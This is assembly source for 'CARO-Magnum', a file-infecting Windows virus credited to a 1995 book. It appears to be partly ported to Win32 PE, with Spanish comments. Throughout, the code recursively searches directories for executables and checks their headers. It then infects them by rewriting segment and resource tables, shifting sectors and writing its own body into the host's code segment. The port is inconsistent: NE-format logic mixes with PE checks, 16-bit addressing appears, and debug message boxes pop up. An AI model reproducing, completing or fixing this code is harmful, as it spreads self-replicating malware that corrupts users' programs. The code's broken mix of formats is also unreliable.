;CARO.ASM: CARO-Magnum, a Windows virus. Launched as a Windows EXE file. This
;demonstrates the use of DPMI and the Windows API in a virus.
;(C) 1995 American Eagle Publications, Inc. All rights reserved.
format PE console
entry  VIRUS
include 'win32ax.inc'

;Useful constants
DATABUF_SIZE EQU 4096 ;size of read/write buf
NEW_HDR_SIZE EQU 40H ;size of new EXE header
VIRUS_SIZE EQU  END_VIRUS -  VIRUS ;size of virus
; EXTRN PostQuitMessage:FAR
 ;EXTRN _lopen:FAR, _lread:FAR, _lwrite:FAR, _llseek:FAR, _lclose:FAR


section '.text' code readable executable
;******************************************************************************
;This is the main virus routine. It simply finds a file to infect and infects
;it, and then passes control to the host program. It resides in the first
;segment of the host program, that is, the segment where control is initially
;passed.



VIRUS:

 call CREATE_DS ;create the data segment
 ; Check for error
 test eax, eax
 jz error_exit

 ; Store memory handle
 mov [MEM_HANDLE], eax


 call VIR_START ;find starting offset of virus
 VIR_START:

  pop esi
  sub esi,VIR_START
  mov dword[VSTART],esi

  call INIT_DS


  ; Mostrar el mensaje utilizando MessageBoxA
  invoke MessageBoxA, 0, [allocated_memory],notify_msg, MB_OK

  stdcall scan_dir, _allfiles

  jc  common_error

  jnz SHORT GOTO_HOST ;z set if a file was found

  call INFECT_FILE ;infect it if found

GOTO_HOST:

 call DESTROY_DS ;clean up memory
 pop es
 pop ds
 pop ebp
 pop edi
 pop esi
 pop edx
 pop ecx
 pop ebx
 pop eax
 popf
VIRUS_DONE:
 jmp HOST ;pass control to host program
VIRUS_ENDP:
 db '(C) 1995 American Eagle Publications Inc., All rights reserved.'
;This routine creates a data segment for the virus. To do that, it
;(1) allocates memory for the virus (2) creates a data segment for that memory
;(3) sets up ds and es with this new selector, and (4) saves the handle for
;the memory so it can be freed when done.
CREATE_DS:
     ; Reservar memoria usando VirtualAlloc
    invoke VirtualAlloc, 0, 4096, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE
    mov [allocated_memory], eax  ; Guardar el puntero al bloque de memoria reservado

    ret



ERROR_CREATE_DS:
   invoke  MessageBoxA, HWND_DESKTOP,ERROR_CREATE_DSM, ERROR_CREATE_DSM, MB_OK

 ret
;CFILE_ID1 DB '*.EXE',0
;CFILE_ID2 DB '*.DLL',0
;CKNAME DB 'KERNEL'

;Initialize data in data segment.
 INIT_DS:

   ; Escribir un mensaje en la memoria reservada
    mov ecx, dword[allocated_memory]
    mov edx, message
    call copy_string_to_memory
    ret


     error_exit:
    ; En caso de error, mostrar un mensaje de error
    invoke MessageBoxA, 0, error_message, notify_msg, MB_OK

    ; Salir del programa con c?digo de error
   ret


.error_exit:
    ; En caso de error, mostrar un mensaje de error
    invoke MessageBoxA, 0, error_message, notify_msg, MB_OK

    ; Salir del programa con código de error
    invoke ExitProcess, 1

    copy_string_to_memory:

    ; Procedimiento para copiar una cadena a la memoria
    push ebx
    push esi
    push edi

    mov esi, edx  ; Origen (puntero a la cadena)
    mov edi, ecx  ; Destino (puntero a la memoria reservada)

    xor ecx, ecx  ; Limpiar contador de repeticiones

.copy_loop:
    mov al, [esi]  ; Leer byte de la cadena
    mov [edi], al  ; Escribir byte en la memoria reservada
    inc esi        ; Avanzar al siguiente byte de la cadena
    inc edi        ; Avanzar al siguiente byte de la memoria reservada
    inc ecx        ; Incrementar contador de repeticiones
    cmp byte [esi], 0  ; Comprobar si hemos llegado al final de la cadena
    jne .copy_loop     ; Si no, continuar copiando

    pop edi
    pop esi
    pop ebx


    ret

   ;This routine frees the memory allocated by CREATE_DS.
   DESTROY_DS:

    ; Liberar la memoria reservada
    invoke VirtualFree, [allocated_memory], 0, MEM_RELEASE
    ret
;******************************************************************************
;This routine searches for a file to infect. It looks for EXE files and then
;checks them to see if they’re uninfected, infectable Windows files. If a file
;is found, this routine returns with Z set, with the file left open, and its
;handle in the bx register. This FIND_FILE searches only the current directory.

scan_dir:

 push    ebp
 mov     ebp, esp
 define file_mask ebp+8
 ; start directory scan (subdirectory too)
 find_first:     push    ebx                             ; save caller ebx/handle
                invoke  FindFirstFileA, dword[file_mask], wfd
                cmp     eax, INVALID_HANDLE_VALUE
                je      step_back                       ; no files, return to prev. dir
                mov     ebx, eax
 output:         cinvoke printf, _fmt, [wfd.dwFileAttributes], wfd.cFileName

                mov     eax, [wfd.dwFileAttributes]
                test    eax, FILE_ATTRIBUTE_DIRECTORY
                jnz next
                call FILE_OK
                jmp find_next ; not directory, continue scan
                next:
 FILE_ATTRIBUTE_REPARSE_POINT = 0x400
                test    eax, FILE_ATTRIBUTE_REPARSE_POINT
                jnz     find_next                       ; symbolic link, continue scan
                mov     eax, dword[wfd.cFileName]
                cmp     ax, "."
                je      find_next                       ; same for dot
                and     eax, 1 shl 24 - 1
                cmp     eax, ".."
                je      find_next                       ; and double dot
; descend into dir and start scan again
                invoke  SetCurrentDirectory, wfd.cFileName
                jmp     find_first
find_next:      invoke  FindNextFileA, ebx, wfd
                test    eax, eax
                jnz     output
                invoke  FindClose, ebx
 step_back:      pop     ebx                             ; dir scanned, restore handle/caller ebx
                cmp     esp, ebp
                jnb     done                            ; no more ebx on stack, done
                invoke  SetCurrentDirectory, _updir     ; ascend one dir level up
                jmp     find_next
  done:         pop     ebp
                retn    4


;This routine determines whether a file is ok to infect. The conditions for an
;OK file are as follows:
;
; (1) It must be a Windows EXE file.
; (2) There must be enough room in the initial code segment for it.
; (3) The file must not be infected already.
;
;If the file is OK, this routine returns with Z set, the file open, and the
;handle in bx. If the file is not OK, this routine returns with NZ set, and
;it closes the file. This routine also sets up a number of important variables
;as it snoops through the file. These are used by the infect routine later.
FILE_OK:


        ; Copiar el nombre de archivo de la estructura wfd a FilePath
        mov esi, wfd.cFileName  ; Puntero al nombre de archivo en la estructura wfd
        mov edi, FilePath       ; Puntero al destino FilePath
        xor ecx, ecx            ; Contador de bucle

    copy_loop:
        mov al, [esi + ecx]    ; Obtener el byte actual del nombre de archivo
        mov [edi + ecx], al    ; Copiar el byte al destino FilePath
        inc ecx                ; Incrementar el contador de bucle
        cmp al, 0              ; Comprobar si hemos alcanzado el final de la cadena
        jnz copy_loop          ; Si no, continuar copiando


  FOK1: mov ebx,eax ;open ok, put handle in bx

   ; Inicializar el puntero al búfer



   ROPEN:
   invoke fopen, FilePath,"r"  ;MILACOM

   cmp eax,0
   je FOK_ERROR2
    mov dword[fileHandle],eax ;guardar puntero para despues  en una variable

    mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
    mov edi, NEW_HDR
    mov ecx,NEW_HDR_SIZE

    call FILE_READ ;ok, read EXE header
    invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK





     cmp word [NEW_HDR],5A4DH;see if first 2 bytes are ’MZ’
     jne  FN1 ;nope, file not an EXE, exit

     cmp byte[NEW_HDR+10h],40H ;see if rel tbl at 10H or more ;antes 18 MILACOM
     jne  FN1 ;nope, it can’t be a Windows EXE


       mov ecx,3Ch ;e_lfanew
       mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
      call FILE_SEEK_ST

      mov edi,e_lfanew
      mov ecx,4 ;dword

     call FILE_READ ;ok, read EXE header
     ;mov edx,DWORD [NEW_HDR+3CH] ;ok, put offset to new header in dx  ;pe gui offset
     invoke MessageBoxA, HWND_DESKTOP,e_lfanew ,notify_msg, MB_OK
      mov ebx,dword[e_lfanew]
      mov dword[NH_OFFSET],ebx ;and save it here

      mov ecx,dword[e_lfanew] ;PE signature
      mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx

      call FILE_SEEK_ST


       ; Mover el puntero del archivo a la posición 80h desde el inicio del archivo


       mov edi, NEW_HDR
       mov ecx,NEW_HDR_SIZE

       call FILE_READ
       invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK


      mov ecx,dword[e_lfanew] ;PE signature
       add ecx,22h
      mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx

      call FILE_SEEK_ST


       ; Mover el puntero del archivo a la posición 80h desde el inicio del archivo


       mov edi,HDR_SEGMENT_TABLE
       xor ecx,ecx
       mov ecx,8

       call FILE_READ
       invoke MessageBoxA, HWND_DESKTOP,HDR_SEGMENT_TABLE ,notify_msg, MB_OK

      cmp DWORD[NEW_HDR],"PE" ;see if this is ’NE’ new header ID
      jnz SHORT FN1 ;nope, not a Windows EXE!



      mov al,byte[NEW_HDR+36H] ;get target OS flags
      and al,2 ;see if target OS = windows
      jz SHORT FOK2 ;ok, go on  ;jnz SHORT FOK2 ;ok, go on
      ;invoke MessageBoxA, HWND_DESKTOP,dword[NEW_HDR+36H] ,notify_msg, MB_OK
       FN1: jmp FOK_ERROR1 ;else exit
       ;If we get here, then condition (1) is fulfilled.
       FOK2:



        mov ecx,dword[e_lfanew] ;ir a la ubicacion informada por e_lfanew
        mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
        call  FILE_SEEK_ST
        ; Lee el campo e_lfanew del encabezado MZ
        xor ecx,ecx
        mov ecx, 4
        mov edi, EntryPoint
        mov ebx,dword[fileHandle]

        call FILE_READ
        invoke MessageBoxA, HWND_DESKTOP,EntryPoint,notify_msg, MB_OK


        ;mov edx,DWORD[NEW_HDR+16H] ;get initial cs

       call GET_SEG_ENTRY ;and read seg table entry into disk buf

        mov eax,DWORD [TEMP+2] ;put segment length in ax
        add eax,VIRUS_SIZE ;add size of virus to it
        jc SHORT FOK_ERROR1 ;if we carry, there’s not enough room
        ;else we’re clear on this count
       ;If we get here, then condition (2) is fulfilled.
        mov ecx,DWORD[NEW_HDR+32H] ;logical sector alignment
        mov eax,1
        shl eax,cl ;ax=logical sector size
         mov ecx,DWORD [TEMP] ;get logical-sector offset of start seg
         mul ecx ;byte offset in dx:ax
        add eax,DWORD [NEW_HDR+14H] ;add in ip of entry point
        adc edx,0
        mov ecx,edx
        mov edx,eax ;put entry point in cx:dx
        call FILE_SEEK_ST ;and seek from start of file
        mov ecx,20H ;read 32 bytes
        mov edx,TEMP ;into buffer
        call FILE_READ
        mov esi,[VSTART]
        mov edi, TEMP
        mov ecx,10H ;compare 32 bytes
        FOK3: mov eax,DWORD[si]
        add esi,2
        cmp eax,dword[di]
        jne SHORT FOK4
        add edi,2
        loop FOK3

FOK_ERROR1:
 call FILE_CLOSE
FOK_ERROR2:
   invoke  MessageBoxA, HWND_DESKTOP,error_message, notify_msg, MB_OK
   mov al,1
   or al,al ;set NZ
ret ;and return to caller
FOK4: xor al,al ;set Z flag
 ret ;and exit

;******************************************************************************
;This routine modifies the file we found to put the virus in it. There are a
;number of steps in the infection process, as follows:
; 1) We have to modify the segment table. For the initial segment, this
; involves (a) increasing the segment size by the size of the virus,
; and (b) increase the minimum allocation size of the segment, if it
; needs it. Every segment AFTER this initial segment must also be
; adjusted by adding the size increase, in sectors, of the virus
; to it.
; 2) We have to change the starting ip in the new header. The virus is
; placed after the host code in this segment, so the new ip will be
; the old segment size.
; 3) We have to move all sectors in the file after the initial code segment
; out by VIRSECS, the size of the virus in sectors.
; 4) We have to move the relocatables, if any, at the end of the code
; segment we are infecting, to make room for the virus code. Then we
; must add the viral relocatables to the relocatable table.
; 5) We must move the virus code into the code segment we are infecting.
; 6) We must adjust the jump in the virus to go to the original entry point.
; 7) We must adjust the resource offsets in the resource table to reflect
; their new locations.
; 8) We have to kill the fast-load area.
;
INFECT_FILE:
 mov edx,dword[NEW_HDR+24H] ;get resource table @
 add edx,dword[NH_OFFSET]
 xor ecx,ecx
 call FILE_SEEK_ST
 mov edx, LOG_SEC
 mov ecx,2
 call FILE_READ
 mov ecx,dword[LOG_SEC]
 mov eax,1
 shl eax,cl
 mov dword[LOG_SEC],eax ;put logical sector size here
 mov eax,dword[NEW_HDR+14H] ;save old entry point
 mov dword[ENTRYPT],eax ;for future use
 mov edx,dword[NEW_HDR+16H] ;read seg table entry
 call GET_SEG_ENTRY ;for initial cs
 mov eax,dword[TEMP] ;get location of this seg in file
 mov dword[INITSEC],eax ;save that here
 mov eax,dword[TEMP+2] ;get segment size
 mov dword[NEW_HDR+14H],eax ;update entry ip in new header in ram
 call SET_RELOCS ;set up RELOCS and CS_SIZE
 mov esi,dword[VSTART]
 mov eax,[esi+ARELOCS] ;now calculate added size of segment
 shl eax,3 ;multiply ARELOCS by 8
 add eax,VIRUS_SIZE
 add eax,dword[CS_SIZE] ;ax=total new size
 xor edx,edx
 mov ecx,dword[LOG_SEC]
 div ecx ;ax=full sectors in cs with virus
 or edx,edx ;any remainder?
 jz SHORT INF05

 inc eax ;adjust for partially full sector
INF05: push eax
 mov eax,dword[CS_SIZE] ;size without virus
 xor edx,edx
 div ecx
 or edx,edx
 jz SHORT INF07
 inc eax
INF07: pop ecx
 sub ecx,eax ;cx=number of secs needed for virus
 mov dword[VIRSECS],ecx ;save this here
 call UPDATE_SEG_TBL ;perform mods in (1) above on file
 mov edx,dword[NH_OFFSET]
 xor ecx,ecx
 call FILE_SEEK_ST ;now move file pointer to new header
 mov edi, NEW_HDR + 37H ;zero out fast load area
 xor eax,eax
 stosb
 stosw
 stosw ;(8) completed
 mov edx, NEW_HDR
 mov ecx,NEW_HDR_SIZE ;update new header in file
 call FILE_WRITE ;mods in (2) above now complete
 call MOVE_END_OUT ;move end of virus out by VIRSECS (3)
 ;also sets up RELOCS count
 call SETUP_KERNEL ;put KERNEL module into virus relocs
 call RELOCATE_RELOCS ;relocate relocatables in cs (4)
INF1: call WRITE_VIRUS_CODE ;put virus into cs (5 & 6)
 call UPDATE_RES_TABLE ;update resource table entries
 call FILE_CLOSE ;close file now
INF2: ret
;The following procedure updates the Segment Table entries per item (1) in
;INFECT_FILE.
UPDATE_SEG_TBL:
 mov edx,dword[NEW_HDR+16H] ;read seg table entry
 call GET_SEG_ENTRY ;for initial cs
 mov eax,dword [TEMP+2] ;get seg size
 add eax,VIRUS_SIZE ;add the size of the virus to seg size
 mov dword [TEMP+2],eax ;and update size in seg table
 mov eax,dword[TEMP+6] ;get min allocation size of segment
 or eax,eax ;is it 64K?
 jz SHORT US2 ;yes, leave it alone
US1: add eax,VIRUS_SIZE ;add virus size on
 jnc SHORT US2 ;no overflow, go and update
 xor eax,eax ;else set size = 64K
US2: mov dword [TEMP+6],eax ;update size in table in ram
 mov al,1
 mov ecx,0FFFFH
 mov edx,-8
 call FILE_SEEK ;back up to location of seg table entry
 mov edx, TEMP ;and write modified seg table entry
 mov ecx,8 ;for initial cs to segment table
 call FILE_WRITE ;ok, init cs seg table entry is modified
 mov edi,dword[NEW_HDR+1CH] ;get number of segment table entries
US3: push edi ;save table entry counter
 mov edx,edi ;dx=seg table entry # to read
 call GET_SEG_ENTRY ;read it into disk buffer
 mov eax,dword[TEMP] ;get offset of this segment in file

 cmp eax,dword[INITSEC] ;higher than initial code segment?
 jle SHORT US4 ;nope, don’t adjust
 add eax,dword[VIRSECS] ;yes, add the size of virus in
US4: mov dword[TEMP],eax ;adjust segment loc in memory
 mov al,1
 mov ecx,0FFFFH
 mov edx,-8
 call FILE_SEEK ;back up to location of seg table entry
 mov edx, TEMP
 mov ecx,8
 call FILE_WRITE ;and write modified seg table entry
 pop edi ;restore table entry counter
 dec edi
 jnz US3 ;and loop until all segments done
 ret ;all done
;This routine goes to the segment table entry number specified in dx in the
;file and reads it into the TEMP buffer. dx=1 is the first entry!
GET_SEG_ENTRY:

 push ebx
 push esi
 push edi


; dec edx
; mov cl,3
; shl edx,cl
 mov edx,dword[NH_OFFSET]

 add edx,dword[NEW_HDR+22H] ;dx=ofs of seg table entry requested
 mov ecx,edx

; call FILE_SEEK_ST ;go to specified table entry
 invoke fseek, [fileHandle],ecx, 0



 jc SHORT GSE1 ;exit on error
 mov edx,TEMP

 mov ebx,dword[fileHandle]
 mov edi, edx
; xor ecx,ecx
; mov cl,8
  mov ecx,8
 call FILE_READ ;read table entry into disk buf


GSE1:
 POP ebx
 POP esi
 POP edi
ret
;This routine moves the end of the virus out by VIRSECS. The “end” is
;everything after the initial code segment where the virus will live.
;The variable VIRSECS is assumed to be properly set up before this is called.
MOVE_END_OUT:
 mov eax,dword[CS_SIZE] ;size of cs in bytes, before infect
 mov ecx,dword[LOG_SEC]
 xor edx,edx
 div ecx
 or edx,edx
 jz SHORT ME01
 inc eax
ME01: add eax,dword[INITSEC] ;ax=next sector after cs
 push eax ;save it
 xor edx,edx
 xor ecx,ecx
 mov al,2 ;seek end of file
 call FILE_SEEK ;returns dx:ax = file size
 mov ecx,dword[LOG_SEC]
 div ecx ;ax=sectors in file
 or edx,edx
 jz ME015 ;adjust for extra bytes
 inc eax
ME015: mov edx,eax ;keep it here
 pop edi ;di=lowest sector to move
 sub edx,edi ;dx=number of sectors to move
MEO2: push edx
 push edi
 call MOVE_SECTORS ;move as much as data buffer allows
 pop edi ;number moved returned in ax
 pop edx
 sub edx,eax

 or edx,edx
 jnz MEO2
 ret
;This routine moves as many sectors as buffer will permit, up to the number
;requested. On entry, dx=maximum number of sectors to move, and di=lowest
;sector number to move. This routine works from the end of the file, so if
;X is the number of sectors to be moved, it will move all the sectors from
;di+dx-X to di+dx-1. All sectors are move out by [VIRSECS].
MOVE_SECTORS:
 push edx ;first determine # of secs to move
 mov eax,DATABUF_SIZE
 mov ecx,dword[LOG_SEC]
 xor edx,edx
 div ecx ;ax=data buf size in logical sectors
 pop edx
 cmp eax,edx ;is ax>dx? (max sectors to move)
 jle SHORT MS1
 mov eax,edx ;ax=# secs to move now
MS1: push eax ;save it till end
 add edi,edx
 sub edi,eax ;di=1st sector to move
 mov ecx,dword[LOG_SEC]
 mul ecx ;ax=bytes to move this time
 push eax ;save it on stack
 mov eax,edi
 mov ecx,dword[LOG_SEC]
 mul ecx
 mov ecx,edx
 mov edx,eax
 call FILE_SEEK_ST ;seek starting sector to move
 pop ecx ;cx=bytes to read
 push ecx
 mov edx, TEMP
 call FILE_READ ;and read it
 mov eax,edi
 add eax,dword[VIRSECS] ;ax=location to move to, in secs
 mov ecx,dword[LOG_SEC]
 mul ecx ;dx:ax=loc to move to, in bytes
 mov ecx,edx ;set up seek function
 mov edx,eax
 call FILE_SEEK_ST ;and move there
 pop ecx ;bytes to write
 mov edx,TEMP
 call FILE_WRITE ;and write proper number of bytes there
 pop eax ;report sectors moved this time
 ret
;This routine sets the variable RELOCS and CS_SIZE variables in memory from the
;uninfected file. Then it updates the relocs counter in the file to add the
;number of relocatables required by the virus.
SET_RELOCS:
 mov dword [RELOCS],0
 mov edx,dword [NEW_HDR+16H] ;read init cs seg table entry
 call GET_SEG_ENTRY
 mov eax,dword [TEMP+4] ;get segment flags
 xor edx,edx
 and ah,1 ;check for relocation data
 mov eax,dword [NEW_HDR+14H] ;size of segment is this
 jz SHORT SRE ;no data, continue
 push eax
 push eax ;there is relocation data, how much?

 mov eax,dword[INITSEC] ;find end of code in file
 mov ecx,dword[LOG_SEC]
 mul ecx ;dx:ax = start of cs in file
 pop ecx ;cx = size of code
 add eax,ecx
 adc edx,0
 mov ecx,edx
 mov edx,eax ;cx:dx = end of cs in file
 push ecx
 push edx
 call FILE_SEEK_ST ;so go seek it
 mov edx, RELOCS
 mov ecx,2
 call FILE_READ ;read 2 byte count of relocatables
 pop edx
 pop ecx
 call FILE_SEEK_ST ;go back to that location
 mov eax,dword[RELOCS]
 push eax
 mov esi,dword[VSTART]
 add eax,dword[esi+ARELOCS]
 mov dword[RELOCS],eax
 mov ecx,2
 mov edx, RELOCS ;and update relocs in the file
 call FILE_WRITE ;adding arelocs to it
 pop dword[RELOCS]
 mov eax,dword[RELOCS]
 shl eax,3
 add eax,2 ;size of relocation data
 pop ecx ;size of code in segment
 xor edx,edx
 add eax,ecx ;total size of segment
 adc edx,0
SRE: mov dword[CS_SIZE],eax ;save it here
 ret
;This routine relocates the relocatables at the end of the initial code
;segment to make room for the virus. It will move any number of relocation
;records, each of which is 8 bytes long. It also adds the new relocatables
;for the virus to the file.
RELOCATE_RELOCS:
 mov eax,dword[RELOCS] ;number of relocatables
 mov cl,3
 shl eax,cl
 add eax,2 ;ax=total number of bytes to move
 push eax
 mov eax,dword[INITSEC]
 mov ecx,dword[LOG_SEC]
 mul ecx ;dx:ax = start of cs in file
 add eax,dword [NEW_HDR+14H]
 adc edx,0 ;dx:ax = end of cs in file
 pop ecx ;cx = size of relocatables
 add eax,ecx
 adc edx,0 ;dx:ax = end of code+relocatables
 xchg eax,ecx
 xchg edx,ecx ;ax=size cx:dx=location
RR_LP: push ecx
 push edx
 push eax
 cmp eax,DATABUF_SIZE
 jle SHORT RR1
 mov eax,DATABUF_SIZE ;read up to DATABUF_SIZE bytes
RR1: sub edx,eax ;back up file pointer
 sbb ecx,0
 push ecx
 push edx
 push eax

 call FILE_SEEK_ST ;seek desired location in file
 pop ecx
 mov edx, TEMP
 call FILE_READ ;read needed number of bytes, # in ax
 pop edx
 pop ecx
 push eax ;save # of bytes read
 add edx,VIRUS_SIZE ;move file pointer up now
 adc ecx,0
 call FILE_SEEK_ST
 pop ecx ;bytes to write
 mov edx, TEMP
 call FILE_WRITE ;write them to new location
 pop eax
 pop edx
 pop ecx
 cmp eax,DATABUF_SIZE ;less than DATABUF_SIZE bytes to write?
 jle SHORT RRE ;yes, we’re all done
 sub eax,DATABUF_SIZE ;nope, adjust indicies
 sub edx,DATABUF_SIZE
 sbb ecx,0
 jmp RR_LP ;and go do another
RRE: mov esi,dword[VSTART]
 mov ecx,dword[esi+ARELOCS] ;now add ARELOCS relocatables to the end
 push esi
 mov edi, TEMP
 add esi, ARELOCS + 2 ;si points to relocatable table
RRL: mov eax,dword[esi] ;move relocatables to buffer and adjust
 stosw
 add esi,2
 mov eax,dword[esi]
 add esi,2
 add eax,dword [NEW_HDR+14H] ;add orig code size to the offset here
 stosw
 mov eax,dword[KERNEL] ;put kernel module ref no next
 add esi,2
 stosw
 mov eax,dword[esi]
 add esi,2
 stosw
 loop RRL
 pop esi
 mov edx,TEMP
 mov ecx,dword[esi+ARELOCS]
 shl ecx,3
 call FILE_WRITE ;and put them in the file
 ret
;This routine finds the KERNEL module in the module reference table, and puts
;it into the virus relocation records.
SETUP_KERNEL:
 xor ecx,ecx
 mov edx,dword[NEW_HDR+28H] ;go to start of module ref tbl
 add edx,dword[NH_OFFSET]
 adc ecx,0
 call FILE_SEEK_ST
 mov edx, TEMP
 mov ecx,40H ;read up to 32 module ofs’s to
 call FILE_READ ;the TEMP buffer
 mov esi, TEMP
SK1: lodsw ;get a module offset
 push esi
 mov edx,dword[NH_OFFSET] ;lookup in imported name tbl
 add edx,dword[NEW_HDR+2AH]
 add edx,eax
 inc edx
 xor ecx,ecx
 call FILE_SEEK_ST ;prep to read module name

 mov ecx,40H
 mov edx, TEMP + 40H
 call FILE_READ ;read it into TEMP at 40H
 pop eax
 push eax
 sub eax, TEMP
 shr eax,1
 mov dword[KERNEL],eax ;assume this is KERNEL
 cmp eax,dword[NEW_HDR+1EH] ;last entry?
 jge SHORT SK2 ;yes, use it by default
 mov edi,TEMP + 40H
 mov esi,KNAME
 mov ecx,6
 repz cmpsb ;check it
 jnz SHORT SK3 ;wasn’t it, continue
SK2: pop esi ;else exit with KERNEL set as is
 ret
SK3: pop esi
 jmp SK1
;This routine writes the virus code itself into the code segment being infected.
;It also updates the jump which exits the virus so that it points to the old
;entry point in this segment.
WRITE_VIRUS_CODE:
 mov eax,dword[INITSEC] ;sectors to code segment
 mov ecx,dword[LOG_SEC]
 mul ecx ;dx:ax = location of code seg
 add eax,dword[NEW_HDR+14H]
 adc edx,0 ;dx:ax = place to put virus
 mov ecx,edx
 mov edx,eax
 push ecx
 push edx ;save these to adjust jump
 call FILE_SEEK_ST ;seek there
 mov edi, TEMP ;move virus code to data segment now
 mov ecx,VIRUS_SIZE
 mov esi,dword[VSTART]
WVCL: mov al,byte[si]
 inc esi
 stosb
 loop WVCL
 mov esi,dword[VSTART] ;now set relocatable areas in code to
 add esi, ARELOCS ;FFFF 0000
 mov ecx,dword[esi]
 add esi,4
WVC2: mov edi,[esi]
 add edi, TEMP
 mov eax,0FFFFH
 stosw
 inc eax
 stosw
 add esi,8
 loop WVC2
 mov ecx,VIRUS_SIZE ;cx=size of virus
 mov edx, TEMP ;dx=offset of start of virus
 call FILE_WRITE ;write virus to file now
 pop edx ;ok, now we have to update the jump
 pop ecx ;to the host
 mov eax, VIRUS_DONE - VIRUS
 inc eax
 add edx,eax
 adc ecx,0 ;cx:dx=location to update
 ;push eax

 call FILE_SEEK_ST ;go there

; pop eax
 inc eax
 inc eax
 add eax,dword[NEW_HDR+14H] ;ax=offset of instr after jump
 sub eax,dword[ENTRYPT] ;ax=distance to jump
 neg eax ;make it a negative number
 mov dword[TEMP],eax ;save it here
 mov ecx,2 ;and write it to disk
 mov edx, TEMP
 call FILE_WRITE ;all done
 ret
;Update the resource table so sector pointers are right.
UPDATE_RES_TABLE:
 mov edx,dword[NEW_HDR+24H] ;move to resource table in EXE
 add edx,dword[NH_OFFSET]
 add edx,2
 xor ecx,ecx
 call FILE_SEEK_ST
URT1:
 mov edx, TEMP
 mov ecx,8
 call FILE_READ ;read 8 byte typeinfo record
 cmp dword[TEMP],0 ;is type ID 0?
 jz SHORT URTE ;yes, all done
 mov ecx,dword[TEMP+2] ;get count of nameinfo records to read
URT2: push ecx
 mov edx, TEMP
 mov ecx,12
 call FILE_READ ;read 1 nameinfo record
 mov eax,dword[TEMP] ;get offset of resource
 cmp eax,dword[INITSEC] ;greater than initial cs location?
 jle SHORT URT3 ;nope, don’t worry about it
 add eax,dword[VIRSECS] ;add size of virus
 mov dword[TEMP],eax
 mov edx,-12
 mov ecx,0FFFFH
 mov al,1 ;now back file pointer up
 call FILE_SEEK
 mov edx,TEMP ;and write updated resource rec to
 mov ecx,12 ;the file
 call FILE_WRITE
URT3: pop ecx
 dec ecx ;read until all nameinfo records for
 jnz URT2 ;this typeinfo are done
 jmp URT1 ;go get another typeinfo record
URTE: ret



FILE_READ:
  push ebp
   mov ebp, esp

    ; Argumentos para fgetc: el primer argumento es el identificador de archivo en ebx
    ; Llamar a fgetc
    invoke fgets,edi,ecx,ebx

    ; Verificar si fgetc falló (retornó -1)
    cmp eax, -1
    je fgetc_failed
   ; Retornar el byte leído (en AL)
    mov esp, ebp
   pop ebp
    ret

file_handle_invalid:
    ; Mostrar mensaje de error
    invoke MessageBoxA, HWND_DESKTOP, error_message, notify_msg, MB_OK

    ; Terminar la función con un valor de error (-1)
    mov eax, -1
    jmp exit_read_byte_from_file

fgetc_failed:
    ; Mostrar mensaje de error
    invoke MessageBoxA, HWND_DESKTOP, fgetc_error_message, notify_msg, MB_OK

    ; Terminar la función con un valor de error (-1)
    mov eax, -1
    jmp exit_read_byte_from_file

exit_read_byte_from_file:
    mov esp, ebp
    pop ebp
    ret


FILE_WRITE:
 push es
 push ebx ;preserve bx through this call
 push ebx ;and pass handle to _lwrite
 push ds
 push edx ;buffer to write from
 push ecx ;bytes to write
RWRITE: call WriteFile
; DB 09AH ;call far ptr _lwrite
;RWRITE: DW 0FFFFH,0
 pop ebx
 pop es
 ret


FILE_SEEK_ST:

  xor edx,edx

FILE_SEEK:

  push ebp
   mov ebp, esp
 RSEEK: invoke fseek, ebx,ecx,edx
; Mover el puntero del archivo a la posición ecx desde el inicio del archivo
mov esp, ebp
pop ebp
   ret
FILE_CLOSE:
 push ebx ;pass handle to _lclose
RCLOSE: call  CloseHandle
; DB 09AH ;call far ptr _lclose
;RCLOSE: DW 0FFFFH,0
 ret
common_error:
; Manejar el error de apertura del archivo aquí
; Por ejemplo, imprimir un mensaje y salir

invoke  MessageBoxA, HWND_DESKTOP, error_message, notify_msg, MB_OK
ret

HOST:
 push 0
 call  ExitProcess ;terminate program (USER)

 no_more_files_found:
    ; Realiza las operaciones finales si no se encontraron más archivos

    ; Restaura la pila y sale del programa
    add esp, 318
    invoke ExitProcess, 0

no_file_found:
    ; Realiza las operaciones si no se encontraron archivos

    ; Restaura la pila y sale del programa
    add esp, 318
    invoke ExitProcess, 0
exit_program:
  invoke ExitProcess, 0
;The following are the relocatables added to the relocation table in this
;sector in order to accomodate the virus. This must be the last thing in the
;code seegment in order for the patch program to work properly.
ARELOCS DD 5 ;number of relocatables to add
R_OPEN DD 103H, ROPEN+1,1,85 ;relocatables table
;R_READ DD 103H, RREAD+1,1,82

R_WRITE DD 103H, RWRITE+1,1,86
R_SEEK DD 103H, RSEEK+1,1,84
R_CLOSE DD 103H, RCLOSE+1,1,81
;******************************************************************************

END_VIRUS: ;label for the end of the windows virus

;No data is hard-coded into the data segment since in Windows, the virus must
;allocate the data segment when it runs. As such, we must assume it will be
;filled with random garbage when the program starts up. The CREATE_DS routine
;below initializes some of the data used in this segment that would be
;hard-coded in a normal program.
section '.data' data readable writeable
DATASTARTEQU dw 0 ; Define DATASTART address
DATAENDEQU dw 1000h ; Define DATAEND address
DATASTART dd $
FILE_ID1 DB 6 dup (?) ;for searching for files
FILE_ID2 DB 6 dup (?) ;for searching for files
KNAME DB 6 dup (?) ;"KERNEL"
FILE_NAME DB 13 dup (?) ;file name
VSTART DD ? ;starting offset of virus in ram
ENTRYPT DD ? ;initial ip of virus start
NH_OFFSET DD ? ;new hdr offs from start of file
VIRSECS DD ? ;secs added to file for virus
INITSEC DD ? ;init cs loc in file (sectors)
RELOCS DD ? ;number of relocatables in cs
LOG_SEC DD ? ;logical sector size for program
    CS_SIZE DD ? ;code segment size
    KERNEL DD ? ;KERNEL module number
    MEM_HANDLE DD ? ;memory handle for data segment
    NEW_HDR DW 40h dup (0) ;space to put new exe header in
    NEW_HDR2 DW 40h dup (0) ;space to put new exe header in
    e_lfanew  DD ?
    EntryPoint  DD ?
    HDR_SEGMENT_TABLE db 8 dup( 0),0
    TEMP DB DATABUF_SIZE dup (?) ;temporary data storage
